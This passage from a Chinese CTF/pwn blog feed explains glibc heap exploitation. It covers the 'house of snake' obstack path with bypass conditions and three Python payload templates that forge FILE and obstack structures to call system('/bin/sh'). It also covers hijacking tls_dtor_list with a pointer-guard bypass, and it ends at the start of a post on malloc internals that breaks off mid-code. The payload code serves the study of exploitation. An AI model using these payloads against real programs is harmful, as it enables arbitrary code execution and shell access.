__printf_buffer_flush_to_file ((<span class="keyword">struct</span> __printf_buffer_to_file *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_asprintf:</span><br><span class="line">      __printf_buffer_flush_asprintf ((<span class="keyword">struct</span> __printf_buffer_asprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_dprintf:</span><br><span class="line">      __printf_buffer_flush_dprintf ((<span class="keyword">struct</span> __printf_buffer_dprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_strfmon:</span><br><span class="line">      __set_errno (E2BIG);</span><br><span class="line">      __printf_buffer_mark_failed (buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp:</span><br><span class="line">      __printf_buffer_flush_fp ((<span class="keyword">struct</span> __printf_buffer_fp *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp_to_wide:</span><br><span class="line">      __printf_buffer_flush_fp_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fp_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里我们关注进入<code>__printf_buffer_flush_obstack</code>函数的这一分支</p><p><strong>__printf_buffer_flush_obstack</strong></p><p><strong>注意此时参数buf类型从__printf_buffer变为了__printf_buffer_obstack</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment"> process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      [...]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设满足所有条件进入<code>obstack_1grow</code>宏定义。</p><p>在这里已经出现house of snake的特征了</p><p><strong>obstack_1grow</strong>宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, 1);      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p><strong>_obstack_newchunk函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure><p>假设满足所有条件，进入<code>CALL_CHUNKFUN</code>这个宏定义，该宏定义的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>可以看到当<code>(((h)-&gt;use_extra_arg)</code>不为0时，会调用<code>(*(h)-&gt;chunkfun)</code>，它的参数是<code>(h)-&gt;extra_arg</code>和<code>(size)</code>，而我们可以控制<code>(*(h)-&gt;chunkfun)</code>与<code>(h)-&gt;extra_arg</code></p><p>豁然开朗,后半部分与<code>_IO_obstack_xsputn</code>的调用链一样。</p><h3 id="绕过条件-1"><a href="#绕过条件-1" class="headerlink" title="绕过条件"></a>绕过条件</h3><p>整个分析过程并将所有相关结构体，并都看成<code>__printf_buffer_as_file</code>结构体，有以下条件：</p><ul><li><strong>在<code>__printf_buffer_as_file_overflow</code>函数中：</strong><ul><li><code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed</code> &amp;&amp; <code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></li></ul></li><li><strong>在<code>__printf_buffer_as_file_commit</code>函数中：</strong><ul><li><code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code></li><li><code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code></li><li><code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code></li><li><code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code></li></ul></li><li><strong>在<code>__printf_buffer_flush</code>函数中：</strong></li><li><code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code></li><li><strong>在<code>__printf_buffer_flush_obstack</code>函数中：</strong></li><li><code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;==&gt; <code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code></li><li><strong>在<code>obstack_1grow</code>宏定义中：</strong><ul><li><code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code></li><li><code>(h)-&gt;use_extra_arg</code>不为0 &lt;==&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></li></ul></li><li>注：</li><li><code>__printf_buffer_mode_obstack</code> 就是<code>0xb</code></li></ul><h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><h3 id="模板方案1-1"><a href="#模板方案1-1" class="headerlink" title="模板方案1"></a>模板方案1</h3><p><strong>分别伪造__printf_buffer与obstack结构体</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = &amp;jumps</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="comment">#------fake __printf_buffer---</span></span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    <span class="comment">#------fake obstack----------</span></span><br><span class="line">    <span class="number">0x110</span>:leak_heap+<span class="number">0x110</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x18</span>:[</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x38</span>:libc.sym.system,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x48</span>:leak_heap+<span class="number">0x110</span>+<span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x50</span>:[<span class="number">0xff</span>]</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="模板方案2-1"><a href="#模板方案2-1" class="headerlink" title="模板方案2"></a>模板方案2</h3><p><strong>obstack结构体与FILE结构体内存复用</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_read_base = <span class="number">0x68732f6e69622f</span>             <span class="comment">#0x18</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = leak_heap+<span class="number">0x18</span>               <span class="comment">#0x48</span></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>:leak_heap, <span class="comment">#fake a obstack</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="模板方案3"><a href="#模板方案3" class="headerlink" title="模板方案3"></a>模板方案3</h3><p><strong>__printf_buffer结构、obstack结构体与FILE结构体内存复用</strong></p><p>这个<code>payload</code>需要的内存是最小的，只需要<code>0xe0</code>字节大小的内存。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = fake_printf_buffer+ <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = fake_fp + <span class="number">0xa0</span>             <span class="comment">#0x48</span></span><br><span class="line">fp._wide_data = <span class="number">0x68732f6e69622f</span>                <span class="comment">#0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a __printf_buffer</span></span><br><span class="line">fp = payload_replace(<span class="built_in">bytes</span>(fp),&#123;</span><br><span class="line">    <span class="number">0x58</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x60</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x68</span>:fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x70</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x78</span>:<span class="number">11</span>,</span><br><span class="line">    <span class="number">0x80</span>:fake_fp</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:fake_printf_buffer,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="劫持tls-dtor-list-利用-call-tls-dtors拿到权限"><a href="#劫持tls-dtor-list-利用-call-tls-dtors拿到权限" class="headerlink" title="劫持tls_dtor_list,利用__call_tls_dtors拿到权限"></a>劫持tls_dtor_list,利用__call_tls_dtors拿到权限</h1><h2 id="概要-21"><a href="#概要-21" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>这个利用也是通过<code>exit</code>触发的，和<code>house of banana</code>实现的效果差不多，利用流程比<code>house of banana</code>简单，但是主要是用于<code>getshell</code>，在开了沙盒后，<code>orw</code>并没有<code>house of banana</code>方便。</p><p><strong>利用条件:</strong></p><ol><li>largebin attack</li><li>能泄露libc和heap</li><li><strong>程序能够显式的执行exit函数</strong>或者<strong>main函数能够返回</strong>,</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-21"><a href="#原理-21" class="headerlink" title="原理"></a>原理</h2><p>首先来看<code>dtor_list</code>结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br></pre></td></tr></table></figure><p>可以看到，<code>tls_dtor_list</code>就是<code>dtor_list</code>的结构体指针，里面存放着一个<code>dtor_list</code>结构体的地址。<br>再看到<code>__call_tls_dtors</code>函数（对<code>tls_dtor_list</code>进行遍历）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"> </span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可知，<code>dtor_list</code>结构体中的<code>func</code>成员，其实是一个函数指针，而其中的<code>obj</code>成员就是其调用时的参数。</p><p>若我们可以劫持<code>tls_dtor_list</code>，在其中写入我们伪造的堆地址，使其不为空（绕过<code>while (tls_dtor_list)</code>），就能执行到<code>func (cur-&gt;obj)</code>，而我们又可以控制伪造的堆块中<code>prev_size</code>域为<code>system</code>的相关数据（由于有指针保护，之后会讲），<code>size</code>域为<code>/bin/sh</code>的地址（通过上一个堆块的溢出或合并后重分配），这样就能<code>getshell</code>了，若是想<code>orw</code>，那么可以让<code>func</code>成员为<code>magic_gadget</code>的相关数据，将<code>rdi</code>与<code>rdx</code>转换后，再调用<code>setcontext + 61</code>走<code>SROP</code>即可。</p><p>需要注意的是，在调用<code>func</code>函数指针之前，对<code>func</code>执行了<code>PTR_DEMANGLE (func)</code>，这是一个指针保护，我们可以通过<code>gdb</code>直接看到其汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ror    rax,0x11</span><br><span class="line">xor    rax,QWORD PTR fs:0x30</span><br><span class="line">mov    QWORD PTR fs:[rbx],rdx</span><br><span class="line">mov    rdi,QWORD PTR [rbp+0x8]</span><br><span class="line">call   rax</span><br></pre></td></tr></table></figure><p>这操作主要是先进行<strong>循环右移</strong><code>0x11</code>位，再与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>进行<strong>异或</strong>，最终得到的数据就是我们的函数指针，并调用。<br>因此，我们在之前所说的将<code>func</code>成员改成的与<code>system</code>相关的数据，就是对指针保护进行一个逆操作：先将<code>system_addr</code>与<code>pointer_guard</code>进行异或，再将结果循环左移<code>0x11</code>位后，填入<code>prev_size</code>域。<br>然而，<code>pointer_guard</code>的值在<code>TLS</code>结构中（在<code>canary</code>保护<code>stack_guard</code>的下一个），我们很难直接得到它的值，但是我们可以通过一些攻击手段，往其中写入我们可控数据，这样就可以控制<code>pointer_guard</code>，进而绕过指针保护了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 两次largebin attack改tls_dtor_list与pointer_guard</span></span><br><span class="line"> </span><br><span class="line">fake_pointer_guard = heap_base + <span class="number">0x17b0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x420</span> + p64(ROL(libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ fake_pointer_guard, <span class="number">0x11</span>, <span class="number">64</span>)) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">hoe2heap!!</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://ixout.github.io/tags/heap/"/>
    
    <category term="how2heap" scheme="https://ixout.github.io/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>malloc-free实现变化</title>
    <link href="https://ixout.github.io/posts/61238/"/>
    <id>https://ixout.github.io/posts/61238/</id>
    <published>2023-07-30T03:26:13.000Z</published>
    <updated>2023-11-28T11:16:30.278Z</updated>
    
    <content type="html"><![CDATA[<span class='p '>以几个主要的经典版本为基础</span><p>另外只关注实现部分,安全检查部分见对应文章</p><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p>2.23是一个十分经典的版本,以其作为基础</p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先判断__malloc_hook符号是否为NULL,如果不为NULL则调用hook函数</li><li>获得arena</li><li>调用__int_malloc获得victim</li><li>如果victim为NULL或者arena不为NULL,再次尝试进行2,3分配</li><li>如果arena不为空,解锁arena的互斥锁</li><li>assert依次判定victim为NULL?vicitim是mmap分配?arena是否匹配?如果三个皆不满足则abort</li></ol><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="初始工作"><a href="#初始工作" class="headerlink" title="初始工作"></a>初始工作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span 